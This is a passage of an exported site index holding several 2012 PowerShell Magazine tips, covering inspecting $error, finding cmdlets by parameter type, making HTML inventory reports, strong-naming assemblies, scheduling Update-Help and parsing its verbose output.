so maybe the Get-Member cmdlet will reveal a useful method:\nPS\u0026gt; $error | Get-Member TypeName: System.Management.Automation.ErrorRecord Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals(System.Object obj) GetHashCode Method int GetHashCode() GetObjectData Method void GetObjectData(System.Runtime.Serialization.SerializationInfo info, System.... GetType Method type GetType() ToString Method string ToString() writeErrorStream NoteProperty System.Boolean writeErrorStream=True CategoryInfo Property System.Management.Automation.ErrorCategoryInfo CategoryInfo {get;} ErrorDetails Property System.Management.Automation.ErrorDetails ErrorDetails {get;set;} Exception Property System.Exception Exception {get;} FullyQualifiedErrorId Property string FullyQualifiedErrorId {get;} InvocationInfo Property System.Management.Automation.InvocationInfo InvocationInfo {get;} PipelineIterationInfo Property System.Collections.ObjectModel.ReadOnlyCollection[int] PipelineIterationInfo {g... ScriptStackTrace Property string ScriptStackTrace {get;} TargetObject Property System.Object TargetObject {get;} PSMessageDetails ScriptProperty System.Object PSMessageDetails {get=\u0026amp; { Set-StrictMode -Version 1; $this.Except... This approach doesn’t work either, because you are getting information about the error objects (System.Management.Automation.ErrorRecord type) contained in the $error variable, not the members of the $error itself. Do you remember our previous tip #PSTip Getting information about a collection object, not its elements? Yes, you need to use -InputObject parameter. You can easily spot the Clear() method now:\nPS\u0026gt; Get-Member -InputObject $error TypeName: System.Collections.ArrayList Name MemberType Definition ---- ---------- ---------- Add Method int Add(System.Object value), int IList.Add(System.Object value) AddRange Method void AddRange(System.Collections.ICollection c) BinarySearch Method int BinarySearch(int index, int count, System.Object value, System.Collections.... Clear Method void Clear(), void IList.Clear() Clone Method System.Object Clone(), System.Object ICloneable.Clone() Contains Method bool Contains(System.Object item), bool IList.Contains(System.Object value) ... ... You could clean out all the entries in $error by calling $error.Clear().\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/01/pstip-how-to-clear-the-error-variable/","tags":["Tips and Tricks"],"title":"#PSTip How to clear the $error variable"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nAt times, we find the need to list all cmdlets that accept a specific type of object as input. In PowerShell 3.0, the –ParameterType parameter of the Get-Command cmdlet can be used to retrieve this list.\nPS\u0026gt; Get-Help Get-Command -Parameter ParameterType -ParameterType Gets commands in the session that have parameters of the specified type. Enter the full name or partial name of a parameter type. Wildcards are supported. The ParameterName and ParameterType parameters search only commands in the current session. This parameter is introduced in Windows PowerShell 3.0. As mentioned in the help text, the value of this parameter can be the full PS type name:\nGet-Command -ParameterType System.Diagnostics.Process  Or we can use wildcards as well – in case we don’t know the full type name:\nGet-Command -ParameterType *uri*  Or we can pass the PSTypeNames property of an object and derive the cmdlets that support the object type as input:\nPS\u0026gt; Get-Command -ParameterType (((Get-Process)[0]).PSTypeNames) CommandType Name ModuleName ----------- ---- ---------- Cmdlet Debug-Process Microsoft.PowerShell.Management Cmdlet Get-Process Microsoft.PowerShell.Management Cmdlet Stop-Process Microsoft.PowerShell.Management Cmdlet Wait-Process Microsoft.PowerShell.Management ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/31/pstip-list-all-cmdlets-that-accept-a-specific-object-type-as-input/","tags":["Tips and Tricks"],"title":"#PSTip List all cmdlets that accept a specific object type as input"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nTab completion and IntelliSense (in ISE) are greatly improved in PowerShell 3.0. They provide names of cmdlets, functions, scripts, workflows, parameters, object properties and methods, paths, files, variables, and even enumeration values. It’s very helpful to get the allowed values (this works for enumerations and ValidateSet values) when you work interactively.\nBut, what to do if you are still using PowerShell 2.0?\nThe easiest way is to try with a wrong value. An error message will give you a list of valid values.\nPS\u0026gt; Set-ExecutionPolicy -ExecutionPolicy wrongvalue Set-ExecutionPolicy : Cannot bind parameter 'ExecutionPolicy'. Cannot convert value \"wrongvalue\" to type \"Microsoft.PowerShell.ExecutionPolicy\" due to invalid enumeration values. Specify one of the following enumeration values and try again. The possible enumeration values are \"Unrestricted, RemoteSigned, AllSigned, Restricted, Default, Bypass, Undefined\".  Here is another example where this approach works nicely:\nPS\u0026gt; (dir test.ps1).attributes = \u0026quot;wrongvalue\u0026quot; Exception setting \u0026quot;Attributes\u0026quot;: \u0026quot;Cannot convert value \u0026quot;wrongvalue\u0026quot; to type \u0026quot;System.IO.FileAttributes\u0026quot; due to invalid enumeration values. Specify one of the following enumeration values and try again. The possible enumeration values are \u0026quot;ReadOnly, Hidden, System, Directory, Archive, Device, Normal, Temporary, SparseFile, ReparsePoint, Compressed, Offline, NotContentIndexed, Encrypted\u0026quot;.\u0026quot; ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/28/pstip-the-easy-way-to-get-allowed-values/","tags":["Tips and Tricks"],"title":"#PSTip The easy way to get allowed values"},{"categories":["Tips and Tricks"],"contents":"In previous tip we saw how to receive all -Verb values for registered extensions. But what if we want to see all available values?\nWe have to modify the original command by removing the format operator. Further, we can also use _Group-Objec_t cmdlet to see count of these values (actions).\ncmd /c assoc | ForEach { $ext = ($_ -split '=')[0]; (New-Object Diagnostics.ProcessStartInfo -Argument \u0026quot;test$ext\u0026quot;).Verbs } | Group-Object | Sort-Object Count -Desc | Format-Table Name, Count -Auto Name Count ---- ----- open 438 shell 114 print 105 AddToPlaylistVLC 74 PlayWithVLC 74 (some lines removed) Uninstall 1 Author 1 Repair 1 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/27/pstip-most-frequently-used-verb-values/","tags":["Tips and Tricks"],"title":"#PSTip Most frequently used -Verb values"},{"categories":["News"],"contents":"One of PowerShell’s most common uses is to collect data and then generate reports from that data. There are a number of different formats in which PowerShell can export data for reporting purposes, such as CSV, XML, and HTML. However, typically the data may only be exported in a raw form and the report made to look pretty using other tools. In this article, based on chapter 12 of* PowerShell Deep Dives*, author Jonathan Medd shows how a process block is used to generate the queries that will produce report data for each computer included in the report.\nPreparing Data for the Report To generate data for a report, I am using a mixture of WMI queries and some standard PowerShell cmdlets to give an example of some typical data you might wish to have in an inventory report. The results of each are stored in variables for later reference and shown in listing 1. This code will be placed in a process block since it will need to execute for every computer we wish to include in the report.\nListing 1 Preparing the inventory queries and variables\n# Inventory Queries $OperatingSystem = Get-WmiObject Win32_OperatingSystem -ComputerName $ComputerName $ComputerSystem = Get-WmiObject Win32_ComputerSystem -ComputerName $ComputerName $LogicalDisk = Get-WmiObject Win32_LogicalDisk -ComputerName $ComputerName $NetworkAdapterConfiguration = Get-WmiObject -Query \u0026quot;Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = 1\u0026quot; -ComputerName $ComputerName $Services = Get-Service -ComputerName $ComputerName $Hotfixes = Get-HotFix -ComputerName $ComputerName # Variable Build $Hostname = $ComputerSystem.Name $DNSName = $OperatingSystem.CSName +\u0026quot;.\u0026quot; + $NetworkAdapterConfiguration.DNSDomain $OSName = $OperatingSystem.Caption $Manufacturer = $ComputerSystem.Manufacturer $Model = $ComputerSystem.Model $Resources = [pscustomobject] @{ NoOfCPUs = $ComputerSystem.NumberOfProcessors RAMGB = $ComputerSystem.TotalPhysicalMemory /1GB -as [int] NoOfDisks = ($LogicalDisk | Where-Object {$_.DriveType -eq 3} | Measure-Object).Count } ... Now we can construct the HTML for each data section using a –Fragment parameter technique. For instance, in the following example I create HTML code for System services info. Note the boldfaced syntax used to sort multiple properties in different directions.\n$ServicesHTML = $Services | Sort-Object @{Expression=\u0026quot;Status\u0026quot;;Descending=$true},@{Expression=\u0026quot;Name\u0026quot;;Descending= [CA]$false} | Select-Object Name,Status | ConvertTo-Html –Fragment This process will be repeated for each section of the report and will generate HTML code for us to insert into the report later (cut for brevity).\n\u0026lt;table\u0026gt; \u0026lt;colgroup\u0026gt;\u0026lt;col/\u0026gt;\u0026lt;col/\u0026gt;\u0026lt;/colgroup\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Status\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Appinfo\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;AudioEndpointBuilder\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Audiosrv\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;BFE\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;BITS\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;BrokerInfrastructure\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; ................. \u0026lt;/table\u0026gt; ... Again though, this is quite static looking data, so why don’t we brighten it up somewhat.\nIn the example of service data turned into HTML, we will typically end up with services that have a Status of either Running or Stopped. It would be great to differentiate these with color and make them stand out better in our report. Figure 1 illustrates an example of this from the report.\nI achieve this by using the –Replace operator. Any text with Running will be replaced with HTML code to turn the word Running green.\n$ServicesFormattedHTML = $ServicesHTML | ForEach { $_ -replace \u0026quot;\u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt;\u0026quot;,\u0026quot;\u0026lt;td style='color: green'\u0026gt;Running\u0026lt;/td\u0026gt;\u0026quot; } I need to assign more than one color though, green for Running and red for Stopped. I can do this without much extra effort however, since I can use multiple –Replace operators on the same line.\n$ServicesFormattedHTML = $ServicesHTML | ForEach { $_ -replace \u0026quot;\u0026lt;td\u0026gt;Running\u0026lt;/td\u0026gt;\u0026quot;,\u0026quot;\u0026lt;td style='color: green'\u0026gt;Running\u0026lt;/td\u0026gt;\u0026quot; -replace \u0026quot;\u0026lt;td\u0026gt;Stopped\u0026lt;/td\u0026gt;\u0026quot;,\u0026quot;\u0026lt;td style=’color: red’\u0026gt;Stopped\u0026lt;/td\u0026gt;\u0026quot; } Summary I hope from these PowerShell tips and tricks you have been able to see a few of the possibilities for how you can transform basic HTML reports with black text on white backgrounds using only ConvertTo-HTML, to something more colorful and presentable as a management type report.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/27/preparing-data-for-the-report/","tags":["News"],"title":"Preparing Data for the Report"},{"categories":["Tips and Tricks"],"contents":"In previous tips we saw how to find possible values of -Verb parameter and how to use it. What about to check all possible -Verb values for all extensions?\nFirst, let’s investigate all registered (associated) extensions in the system. There is a native tool named assoc. As it’s a part of cmd.exe, we have to call it inside command line. If it’s used without a parameter, it will display all associations.\nPS\u0026gt; cmd /c assoc | Select-Object -First 10 .323=h323file .386=vxdfile .3g2=VLC.3g2 .3gp=VLC.3gp .3gp2=VLC.3gp2 .3gpp=VLC.3gpp .5vw=wireshark-capture-file .7Z=WinZip .aac=aacfile .aca=Agent.Character.2  Let’s test the whole process with the first extension returned. We need to split input line to receive just that extension.\nPS\u0026gt; cmd /c assoc | Select-Object -First 1 | ForEach { ($_ -split '=')[0] } .323  We used Split operator to obtain just the text before the equal sign. Now we’ll use previous tip to see all possible -Verb values.\ncmd /c assoc | Select-Object -First 1 | ForEach { ($_ -split '=')[0] } | ForEach { (New-Object System.Diagnostics.ProcessStartInfo -ArgumentList \u0026quot;test$_\u0026quot;).Verbs } open We created a new ProcessStartInfo object and passed a dummy file name to it – in this case named test.323. From the object we created, we extracted only its Verbs property. As we don’t need to create an object from the output, it’s sufficient to send the output to Out-GridView cmdlet. But before that, let’s remove double call of ForEach-Object cmdlet.\ncmd /c assoc | Select-Object -First 10 | ForEach { $ext = ($_ -split '=')[0]; \u0026quot;{0}: {1}\u0026quot; -f $ext, ((New-Object System.Diagnostics.ProcessStartInfo -ArgumentList \u0026quot;test$ext\u0026quot;).Verbs -join ', ') } .323: open .386: .3g2: AddToPlaylistVLC, Open, PlayWithVLC .3gp: AddToPlaylistVLC, Open, PlayWithVLC .3gp2: AddToPlaylistVLC, Open, PlayWithVLC .3gpp: AddToPlaylistVLC, Open, PlayWithVLC .5vw: open .7Z: open, print .aac: Batch Convert with WavePad Sound Editor, Convert sound file, Edit sound file, Edit with WavePad Sound Editor .aca: We used PowerShell’s format operator (-f) to have output formatted like: ext: Verb1, Verb2, … Now we can remove Select-Object and send all data to the Out-GridView:\ncmd /c assoc | ForEach { $ext = ($_ -split '=')[0]; \"{0}: {1}\" -f $ext, ((New-Object System.Diagnostics.ProcessStartInfo -ArgumentList \"test$ext\").Verbs -join ', ') } | Out-GridView -Title 'Verb values for associated extensions'  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/26/pstip-explore-all-possible-verb-values-for-registered-file-extensions/","tags":["Tips and Tricks"],"title":"#PSTip Explore all possible -Verb values for registered file extensions"},{"categories":["Module Spotlight","PSCX"],"contents":"When developing software based on .NET it is quite common to strong name your assemblies especially if you’re a library vendor providing your libraries to other people. One rule of strong named assemblies is that every other assembly they depend upon must also be strong named. If you are a managed library vendor and you don’t provide strong named assemblies, you prevent your users from strong naming their assemblies. Or much more likely, your users will find another library that is strong named.\n.NET assemblies are strong named using an asymmetric cryptographic keyfile usually generated by the .NET Framework SDK utility sn.exe. Development shops typically try to protect the public-private key pair in the keyfile by limiting access to the file, putting it only on dedicated build machines. For developers, a public key file is created that can be used to partially sign an assembly which is also sometimes referred to as “delay signing” e.g.:\nC:\\PS\u0026gt; sn –p .\\keyfile.snk public.snk\nDelay signed assemblies are consider strong named for assembly referencing purposes but the CLR loader will not load them directly. Developers usually run sn.exe to bypass the strong name verification check for these partially signed assemblies e.g.:\nPS\u0026gt; sn –t .\\public.snk # display public key token xxxxxxxxxxxxxxxx PS\u0026gt; sn –Vr *,\u0026lt;copy-pasted-public-key-token\u0026gt; Now if you tried the commands above in your PowerShell console there’s a good chance you’ll get an error indicating PowerShell doesn’t recognize sn.exe as a valid command. Normally, you would run this tool from a Visual Studio Command Prompt which will have the PATH environment variable configured to include the .NET Framework SDK. But this is PowerShell column and we want to use PowerShell. Fortunately the PowerShell Community Extensions (2.1 and 3.0) provides an easy to get the PowerShell environment configured in the same way. Just execute the following command:\nPS\u0026gt; Import-VisualStudioVars 2012  Of course, you can also supply arguments of “2008” and “2010”. Once you’ve executed this command, PowerShell will be able to find all the standard Windows and .NET Framework SDK tools. Note also that Import-VisualStudioVars will configure the environment for either x86 or x64 tools based on the bitness of the PowerShell session.\nNow that we’ve got all that configured, developers can happily run and debug their partially signed assemblies. Yay! However, someone on the team gets the job making sure the final build re-signs the assemblies with the full (public/private) keyfile.\nOne popular way to do this is to walk all binaries in the Binaries directory and run the sn.exe tool against. However, it is quite common that even managed software has some native binaries in the output and sn.exe will error on a native binary. Fortunately, the PowerShell Community Extensions provides a handy command called Test-Assembly to help you determine if a file is a managed assembly or not. The loop to accomplish looks something like this:\nGet-ChildItem . –Recurse –Include *.dll,*.exe | Where-Object {Test-Assembly $_} | Foreach-Object {sn.exe $_.Fullname keyfile.snk}  With that, your developers are able to get their job done without requiring access to the private key file and your build machine is able to easily re-sign only the managed binaries. Don’t forget that if you’re also Authenticode signing your assemblies, you will need to do that step after re-signing the partially signed assemblies.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/26/how-to-strong-name-partially-signed-assemblies/","tags":["Modules","PSCX"],"title":"How to strong name partially signed assemblies"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0.\nIn PowerShell 3.0 you need to run the Update-Help cmdlet in order to stay up-to-date whenever new help content is available. The problem? You don’t know when new content is released (unless you visit the Updatable Help Status Table page periodically).\nTo ensure that your system has the latest help files, you can register a scheduled job that runs at specific intervals and runs the Update-Help cmdlet. In the following example, Update-Help will execute every day at 05:00 AM.\nRegister-ScheduledJob -Name UpdateHelp ` -ScheduledJobOption @{RunElevated=$true} ` -ScriptBlock {Update-Help -Force -Verbose} ` -Trigger @{At='5:00 AM';Frequency='Daily'}  You can find the newly created task in Task Scheduler UI, on the left pane, under the Task Scheduler Library\\Microsoft\\Windows\\PowerShell\\ScheduledJobs task folder.\nOnce the job has finished running you can get its result by using the job cmdlets:\nGet-Job -Name UpdateHelp | Receive-Job -Keep  For more information about scheduled jobs, see about_Scheduled_Jobs.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/25/pstip-keeping-your-help-files-up-to-date/","tags":["Tips and Tricks"],"title":"#PSTip Keeping your help files up to date"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nPowerShell offers a powerful method of working with URIs by leveraging the System.Uri .NET class which offers many properties and methods that provide a way to easily manipulate and compare URIs. This class can be utilized by using the [System.Uri] notation in PowerShell. You can get the full list of properties and methods by using the following command:\nPS\u0026gt; [System.Uri]'https://powershellmagazine.com' | Get-Member An interesting feature is the ability to get the relative path of a URI. It can be done by using the MakeRelativeUri method:\nPS\u0026gt; $BingQuery=[System.Uri]'http://www.bing.com/search?q=powershell+magazine\u0026amp;go=\u0026amp;qs=n\u0026amp;form=QBLH\u0026amp;filt=all\u0026amp;pq=powershell+magazine\u0026amp;sc=1-18\u0026amp;sp=-1\u0026amp;sk=' PS\u0026gt; $BingUri=[System.Uri]'http://www.bing.com' PS\u0026gt; $BingUri.MakeRelativeUri($BingQuery.AbsoluteUri).OriginalString search?q=powershell+magazine\u0026amp;go=\u0026amp;qs=n\u0026amp;form=QBLH\u0026amp;filt=all\u0026amp;pq=powershell+magazine\u0026amp;sc=1-18\u0026amp;sp=-1\u0026amp;sk= Another interesting property is the DNSSafeHost. It contains the DNS hostname which can be used to check connectivity as is shown in the next example:\nPS\u0026gt; Test-Connection $BingQuery.DnsSafeHost The GetLeftPart() method can be used to only select a portion of a URI. This method takes the [System.UriPartial] enum as its argument. There are four enumeration names available, which can be displayed by executing the following line of code:\nPS\u0026gt; [Enum]::GetNames([System.UriPartial]) Scheme Authority Path Query When using Authority as a partial URI only the protocol and the DNS name portion of the URI will be shown:\nPS\u0026gt; $Partial = [System.UriPartial]'Authority' PS\u0026gt; $BingQuery.GetLeftPart($Partial) http://www.bing.com ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/24/pstip-working-with-a-uniform-resource-identifier-uri-in-powershell/","tags":["Tips and Tricks"],"title":"#PSTip Working with a Uniform Resource Identifier (URI) in PowerShell"},{"categories":["Tips and Tricks"],"contents":"The parameters for a PowerShell command can be quite complex. Some parameters are only valid in certain parameter sets. Parameters have types, may be mandatory or optional, can have aliases and may or may not support pipeline input. The standard PowerShell mechanism to inspect a command’s parameters is to look at the command’s help page. This can be informative. See the output for a few of the parameters to Get-Process:\n-Id \u0026lt;Int32[]\u0026gt; Specifies one or more processes by process ID (PID). To specify multiple IDs, use commas to separate the IDs. To find the PID of a process, type \u0026quot;get-process\u0026quot;. Required? True Position? Named Default value Accept pipeline input? true (ByPropertyName) Accept wildcard characters? False -Name \u0026lt;String[]\u0026gt; Specifies one or more processes by process name. You can type multiple process names (separated by commas) and use wildcard characters. The parameter name (\u0026quot;Name\u0026quot;) is optional. Required? False Position? 1 Default value Accept pipeline input? true (ByPropertyName) Accept wildcard characters? true What the help file doesn’t show is that these two parameters are in different parameter sets and can’t be used in the same command invocation. Also, the help isn’t always in lock-step with the actual parameters based on the way the help files are created.\nThe ultimate source of parameter information is in the CmdletInfo object for the command. We can see some of this information using PowerShell’s Get-Command cmdlet:\nPS\u0026gt; Get-Command Get-Process -Syntax Get-Process [[-Name] \u0026lt;string[]\u0026gt;] [-ComputerName \u0026lt;string[]\u0026gt;] [-Module] [-FileVersionInfo] [\u0026lt;CommonParameters\u0026gt;] Get-Process -Id \u0026lt;int[]\u0026gt; [-ComputerName \u0026lt;string[]\u0026gt;] [-Module] [-FileVersionInfo] [\u0026lt;CommonParameters\u0026gt;] Get-Process -InputObject \u0026lt;Process[]\u0026gt; [-ComputerName \u0026lt;string[]\u0026gt;] [-Module] [-FileVersionInfo] [\u0026lt;CommonParameters\u0026gt;] This at least shows us that there are different parameter sets and that the Id and Name parameters are in different parameter sets. We even get type information for the parameters. However there is no information about accepting pipeline input nor is there any information on parameter aliases.\nThere is a command in the PowerShell Community Extensions (2.1 and 3.0) that displays rich parameter information in an easy to read format:\nPS\u0026gt; Get-Parameter Get-Process Command: Microsoft.PowerShell.Management/Get-Process Set: Name Name Aliases Position Mandatory Pipeline ByName Provider Type ---- ------- -------- --------- -------- ------ -------- ---- ComputerName {Cn, co, ... Named False False True All String[] FileVersionInfo {FV, FVI,... Named False False False All SwitchPara... Module {m, mo, m... Named False False False All SwitchPara... Name {ProcessN... 0 False False True All String[] Command: Microsoft.PowerShell.Management/Get-Process Set: Id Name Aliases Position Mandatory Pipeline ByName Provider Type ---- ------- -------- --------- -------- ------ -------- ---- ComputerName {Cn, co, ... Named False False True All String[] FileVersionInfo {FV, FVI,... Named False False False All SwitchPara... Id {PID, id} Named True False True All Int32[] Module {m, mo, m... Named False False False All SwitchPara... Command: Microsoft.PowerShell.Management/Get-Process Set: InputObject Name Aliases Position Mandatory Pipeline ByName Provider Type ---- ------- -------- --------- -------- ------ -------- ---- ComputerName {Cn, co, ... Named False False True All String[] FileVersionInfo {FV, FVI,... Named False False False All SwitchPara... InputObject {in, inp,... Named True True False All Process[] Module {m, mo, m... Named False False False All SwitchPara... As you can see, there’s much more usable information available from the Get-Parameter command.\nNote: There are many more useful PowerShell Community Extensions (PSCX) commands. If you are interested in this great community project led by PowerShell MVPs Keith Hill and Oisin Grehan, give PSCX a try at http://pscx.codeplex.com.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/21/pscxtip-getting-details-about-a-commands-parameters/","tags":["Tips and Tricks"],"title":"#PSCXTip Getting details about a command’s parameters"},{"categories":["Tips and Tricks"],"contents":"When dealing with files under source control it is quite often useful to be able to make a bunch of files readonly or writable in bulk. You can do this fairly easily in PowerShell 3.0:\nPS\u0026gt; Get-ChildItem . –Recurse –File | Foreach {$_.IsReadOnly = $false}  However the PowerShell Community Extensions (1.2 or higher) provides an even easier way to do this common operation with two commands Set-ReadOnly (alias sro) and Set-Writable (alias swr). The above operation simplifies to this:\nPS\u0026gt; Get-ChildItem . –Recurse –File | Set-ReadOnly  If you only need to make a set of files in the current directory readonly or writable, you can use this form:\nPS\u0026gt; Set-Writable *.cs  Or using the aliases:\nPS\u0026gt; swr *.cs; sro *.csproj  One final common file manipulation is to “touch” a file to set its last write time to the current time (or any specified time). This can be done with the PSCX command Set-FileTime (alias touch) e.g.:\nPS\u0026gt; Set-FileTime *.cs  Or using the alias:\nPS\u0026gt; touch *.cs  If you need to set the last write time to a specific time you can use the Time parameter e.g.:\nPS\u0026gt; Get-ChildItem . –r –File | Set-FileTime -Time ((Get-Date).AddDays(-14))  By default Set-FileTime updates the last write and last accessed times. You can specify the –Created switch to update the file’s creation time.\nNote: There are many more useful PowerShell Community Extensions (PSCX) commands. If you are interested in this great community project led by PowerShell MVPs Keith Hill and Oisin Grehan, give PSCX a try at http://pscx.codeplex.com.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/12/20/pscxtip-manipulating-file-attributes/","tags":["Tips and Tricks"],"title":"#PSCXTip Manipulating file attributes"},{"categories":["How To"],"contents":"If you’ve updated PowerShell to version 3.0 you probably noticed that help is no longer shipped in the box. PowerShell 3.0 includes a new feature, the Updatable Help system, which allows you to ensure that help on the local computer stays up to date.\nPowerShell is now a part of the operating system and operating systems gets to be updated only during service packs or specific patches. The Updatable Help system and its cmdlets (*-Help) make it easy to download and install help files, or updating exiting help files, as soon as newer help files become available.\nTo download and install help files for the first time, use the Update-Help cmdlet. When executed, Update-Help goes through a series of steps to get the latest help versions of the modules installed on your system:\n It determines which modules support updatable help by checking the HelpInfoUri key in the module manifest file. The HelpInfoUri contains the Internet location where each module stores its updatable help files. Compares each module local help files with the newest help files that are available for each module. Downloads the new files (packaged in a cab file). Unwraps the help file package, verifies that the files are valid, and then installs the help files in the language-specific subdirectory of the module directory.  Note: There are a few things to take into account when using Update-Help. First, you must run PowerShell as an administrator as help files are written to the installation folder of PowerShell and that happens to be under the System32 folder. PowerShell allows you to update help files once every 24 hours. To override this behaviour you must specify the -Force switch.\nBy default, the Update-Help cmdlet doesn’t generate any output. When executed, it displays a progress bar that prints information about the current module update phase.\nIf you want to see what’s going on under the hood, include the -Verbose switch:\nOne of the things that really annoys me is the output of the -Verbose switch, the way it is written makes it very hard to read and determine which files and modules has been updated. In this post I want to introduce you to a new feature in PowerShell 3.0 that can help you change the way the verbose information is displayed in the console.\nIn the previous version of PowerShell it was very hard to capture the output of the Verbose stream, or any other PowerShell-related stream. Luckily, this has changed in PowerShell 3.0 and now it is a very easy thing to do. We can now redirect and merge any of the pipeline output streams (see list below) to text files. You can read more about this in about_Redirection help topic.\nBy default, the Update-Help command doesn’t write anything to the pipeline so we can safely merge the verbose stream to the standard output stream and parse it without having to worry about information from both sources gets mixed together.\nEach redirection operator uses a character to represent each output type:\n All output 1 – Success output 2 – Errors 3 – Warning messages 4 – Verbose output 5 – Debug messages  The Verbose stream constant is 4, and Success output is 1, so we use the redirection operator (e.g ‘\u0026gt;’) to funnel the output:\nPS\u0026gt; $uh = Update-Help -Verbose -Force 4\u0026gt;\u00261  Let’s examine the first element; we can see that the connection is redirecting to another URI.\nPS\u0026gt; $uh[0] VERBOSE: Your connection has been redirected to the following URI: VERBOSE: \u0026quot;http://download.microsoft.com/download/3/4/C/34C6B4B6-63FC-46BE-9073-FC75EAD5A136/\u0026quot; The second element in the output of Update-Help contains the information we are after. We can see that the Microsoft.PowerShell.Management was updated, and we also get information about the path of the help file, its culture, and the version information.\nPS\u0026gt; $uh[1] VERBOSE: Microsoft.PowerShell.Management: Updated VERBOSE: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\Microsoft.PowerShell.Commands.Management.dll-hel p.xml. Culture en-US VERBOSE: Version 3.1.0.0 Let’s see what Get-Member has to say about it:\nPS\u0026gt; $uh[1] | Get-Member TypeName: System.Management.Automation.VerboseRecord Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals(System.Object obj) GetHashCode Method int GetHashCode() GetType Method type GetType() ToString Method string ToString() WriteVerboseStream NoteProperty System.Boolean WriteVerboseStream=True InvocationInfo Property System.Management.Automation.InvocationInfo InvocationInfo {get;} Message Property string Message {get;set;} PipelineIterationInfo Property System.Collections.ObjectModel.ReadOnlyCollection[int] PipelineIterationInfo {get;} We get a System.Management.Automation.VerboseRecord object which describes a verbose message sent to the verbose stream, and information about the command that sent the message (InvocationInfo). The Message property contains the actual message we see in the console. If you need to identify verbose messages written to the success stream, you can safely rely on this type and filter objects accordingly.\nPS\u0026gt; $uh[1].Message Microsoft.PowerShell.Management: Updated C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\Microsoft.PowerShell.Commands .Management.dll-help.xml. Culture en-US Version 3.1.0.0  We can split the message (by default the Split method breaks the string on the space character) and get access to the array elements we get back:\nPS\u0026gt; $uh[1].Message.split() Microsoft.PowerShell.Management: Updated C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\Microsoft.PowerShell.Commands.Management.dll-help.xml. Culture en-US Version 3.1.0.0 Based on the output of the Split operation, we want to extract the relevant pieces of information, create a new custom object and write it back to the pipeline, one object at a time.\nThe information we want is:\n The module name–it\u0026rsquo;s the first item (index 0). The value is followed by a colon, we\u0026rsquo;ll remove it later on. The file path that’s being updated (third line, index 2). The culture of the help file (fifth line, index 4). The version of the new help file (last line, we can refer to it as index -1, which in PowerShell gives back the last array element).  We can now construct a new custom object. We\u0026rsquo;ll start by creating a custom object for the first array element:\n$message = $uh[1].Message.split()[0,2,4,-1] [PSCustomObject]@{ Module = $message[0] -replace ':$' FileName = (Split-Path $message[1] -Leaf).Trim('.') Culture = $message[2] Version = $message[-1] } Module FileName Culture Version ------ -------- ------- ------- Microsoft.PowerShell.Manag... Microsoft.PowerShell.Comma... en-US 3.1.0.0 As soon as each object (verbose message) is processed, the object goes out to the console. As you can see, the output of the Module and FileName properties is truncated.\nWe could use the -AutoSize of the Format-Table cmdlet to adjust the columns size, but doing so will block output of objects to the console until all objects were processed.\nWhen processing the verbose stream we also want to avoid processing unnecessary messages, we want to skip any messages that contains URI redirections, so we process only messages that contains the word “Updated”. We pipe the custom objects to the Tee-Object cmdlet, to send output to the console as soon as it flows in, and also save the output to a variable that we can format the way we want it to.\nHere’s the full snippet. Output shown on screen is also saved in the UpdatedHelp variable. When the script finished executing we can investigate and format it as we like.\nUpdate-Help -Force -Verbose 4\u0026gt;\u0026amp;1 | Where-Object {$_.Message -like '*: Updated*'} | ForEach-Object { $message = $_.Message.Split()[0,2,4,-1] [PSCustomObject]@{ Module = $message[0] -replace ':$' FileName = (Split-Path $message[1] -Leaf).Trim('.') Culture = $message[2] Version = $message[-1] } } | Tee-Object -Variable UpdatedHelp $UpdatedHelp | Format-Table -AutoSize Lastly, if you run the code more than once you’ll 